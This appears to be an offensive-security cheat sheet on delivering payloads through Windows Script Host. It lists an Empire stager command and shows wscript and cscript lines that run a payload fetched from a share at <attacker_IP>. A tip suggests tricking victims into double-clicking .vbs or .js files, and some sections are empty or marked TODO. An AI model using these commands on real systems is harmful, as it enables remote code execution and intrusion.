# Windows Scripting Host

## 01 - Generate Payloads

### 1.1 - `msfvenom`

```

```

### 1.2 - Empire

TODO: Fill this info

```
(Empire) > usestager windows/launcher_vbs
```

## 02 - Execute Payloads

> [!TIP] Windows Scripting Host Payloads
> You can actually social engineer the victim to double click the `.vbs` or `.js` to establish connection.

### 2.1 - VBScript

```
C:\> wscript.exe <script.js | script.vbs>

C:\> wscript.exe //E:vbscript \\<attacker_IP>\path\to\payload.vbs
```

### 2.2 - JScript

```
C:\> cscript.exe <script.js | script.vbs | script.cs>

C:\> cscript.exe //E:jscript \\<attacker_IP>\path\to\payload.vbs
```

---
## References

### Hacktricks

- [Hacktricks: Windows Reverse Shells](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/reverse-shells/windows.html)

### Red Team Notes

- [Red Team Notes: `pubprn.vbs` Signed Script Code Execution](https://www.ired.team/offensive-security/code-execution/t1216-signed-script-ce)